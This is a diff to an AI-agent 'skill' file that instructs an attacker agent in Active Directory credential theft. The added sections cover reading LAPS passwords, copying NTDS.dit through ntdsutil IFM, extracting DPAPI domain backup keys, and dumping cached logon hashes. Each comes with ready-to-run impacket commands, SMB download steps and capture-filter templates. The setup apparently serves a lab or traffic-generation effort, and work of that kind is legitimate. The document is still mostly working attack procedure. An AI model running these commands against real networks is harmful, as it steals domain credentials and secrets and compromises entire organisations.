@@ -1,6 +1,6 @@
 ---
 name: ad-credential
-description: Credential-access Active Directory skill for an attacker agent on a domain-joined Windows host. Covers password spray/brute, AS-REP and Kerberoasting, secretsdump/DCSync, GPP, and LSASS dump. Load this skill when the task names ad-credential. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
+description: Credential-access Active Directory skill for an attacker agent on a domain-joined Windows host. Covers password spray/brute, AS-REP and Kerberoasting, secretsdump/DCSync, GPP, LSASS dump, LAPS, NTDS.dit IFM, DPAPI, and cached logons. Load this skill when the task names ad-credential. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
 ---
 
 # AD Credential Access Skill
@@ -336,6 +336,168 @@ python scripts/state.py add files '{"path": "lsass.dmp", "description": "LSASS m
 
 Rollback: if the dump yields nothing usable, `mark-stale` the file entry and re-dump with a fresh admin credential.
 
+
+Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
+
+```
+python scripts/write_filter.py --expression "<filled display filter>"
+```
+
+Template:
+
+```
+ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
+```
+
+
+## 2.10 LAPS Password
+
+- Technique id: `credential.laps`
+- ATT&CK: T1555 (Credentials from Password Stores)
+
+Purpose: read LAPS-managed local administrator passwords from Active Directory.
+
+Inputs: a user object with `password` from `users` (needs rights to read `ms-Mcs-AdmPwd`), plus `domain.name` and `domain.dc_ip`.
+
+Procedure (one atomic action):
+
+```
+python -m impacket.examples.GetLAPSPassword -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
+```
+
+Outputs: for each recovered LAPS password, add a user object (local administrator on that host):
+
+```
+python scripts/state.py add users '{"username": "<laps-admin>", "password": "<laps-password>", "logon_hosts": ["<target-ip>"], "source": "credential.laps"}'
+```
+
+Rollback: if a LAPS password is later rejected, `mark-stale` the user object and re-run.
+
+Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
+
+```
+python scripts/write_filter.py --expression "<filled display filter>"
+```
+
+Template:
+
+```
+ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || kerberos || tcp.port == 389 || tcp.port == 636 || tcp.port == 88)
+```
+
+
+## 2.11 NTDS.dit IFM Copy
+
+- Technique id: `credential.ntds-dit`
+- ATT&CK: T1003.003 (OS Credential Dumping: NTDS)
+
+Purpose: create a volume-shadow / `ntdsutil` IFM copy of `ntds.dit` on a DC and pull the files. This is a disk replica. Do **not** substitute `credential.dcsync` (`secretsdump -just-dc` replication).
+
+Inputs: an admin user object with `password` from `users`, plus a DC host (`domain.dc_ip` / `hosts[].role` is `dc`).
+
+Procedure (one atomic action — IFM on the DC, then download):
+
+```
+python -m impacket.examples.wmiexec <domain.name>/<admin-user>:<password>@<domain.dc_ip> 'ntdsutil "activate instance ntds" ifm "create full C:\Windows\Temp\ifm" q q'
+```
+
+Download with `smbclient`: `use C$`, `get Windows\Temp\ifm\Active Directory\ntds.dit`, `get Windows\Temp\ifm\registry\SYSTEM`. Offline parse is an operator step: `python -m impacket.examples.secretsdump -ntds ntds.dit -system SYSTEM LOCAL`.
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "ntds.dit", "description": "NTDS.dit IFM copy from <dc-ip>"}'
+python scripts/state.py add files '{"path": "SYSTEM", "description": "SYSTEM hive from NTDS IFM on <dc-ip>"}'
+```
+
+Rollback: if the copy is unreadable, `mark-stale` the file entries and re-run IFM.
+
+Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
+
+```
+python scripts/write_filter.py --expression "<filled display filter>"
+```
+
+Template:
+
+```
+ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
+```
+
+
+## 2.12 DPAPI Backup Keys / Masterkeys
+
+- Technique id: `credential.dpapi`
+- ATT&CK: T1555.003 (Credentials from Password Stores: Credentials from Web Browsers) / T1555
+
+Purpose: retrieve DPAPI domain backup keys or decrypt a DPAPI blob with `impacket.examples.dpapi`.
+
+Inputs: a user object with `password` from `users`, plus `domain.dc_ip`. Optional: a DPAPI blob path already in `files[]`.
+
+Procedure (one atomic action). Domain backup keys:
+
+```
+python -m impacket.examples.dpapi backupkeys -t <domain.name>/<user>:<password>@<domain.dc_ip>
+```
+
+Decrypt a specific masterkey / credential blob when a file is named in the task (sub-variant of the same tool):
+
+```
+python -m impacket.examples.dpapi masterkey -file <masterkey-path> -sid <sid> -password <password>
+```
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "<dpapi-output>", "description": "DPAPI backup keys or decrypted blob"}'
+```
+
+If a cleartext credential falls out, also `add users`.
+
+Rollback: if decryption fails, `mark-stale` the file entry and re-run with a current password.
+
+Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
+
+```
+python scripts/write_filter.py --expression "<filled display filter>"
+```
+
+Template:
+
+```
+ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || ldap || tcp.port == 445 || tcp.port == 135 || tcp.port == 389)
+```
+
+
+## 2.13 Cached Domain Logon Hashes
+
+- Technique id: `credential.cached-logon`
+- ATT&CK: T1003.005 (OS Credential Dumping: Cached Domain Credentials)
+
+Purpose: export SECURITY/SYSTEM hives from a host and dump MSCACHE/cached domain logon hashes. Distinct from `credential.dump-secrets` (SAM/LSA secrets over DCERPC in one `secretsdump` shot).
+
+Inputs: an admin user object with `password` from `users`, plus the target host.
+
+Procedure (one atomic action — save hives remotely, download, dump locally):
+
+```
+python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hiv /y & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hiv /y'
+```
+
+Download with `smbclient` (`use C$`, `get Windows\Temp\SECURITY.hiv`, `get Windows\Temp\SYSTEM.hiv`), then:
+
+```
+python -m impacket.examples.secretsdump -security SECURITY.hiv -system SYSTEM.hiv LOCAL
+```
+
+Outputs:
+
+```
+python scripts/state.py add users '{"username": "<user>", "ntlm_hash": "<cached-hash>", "logon_hosts": ["<target-ip>"], "source": "credential.cached-logon"}'
+python scripts/state.py add files '{"path": "SECURITY.hiv", "description": "SECURITY hive from <target-ip>"}'
+```
+
+Rollback: if a cached hash fails to authenticate, `mark-stale` it and re-dump.
 
 Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
 
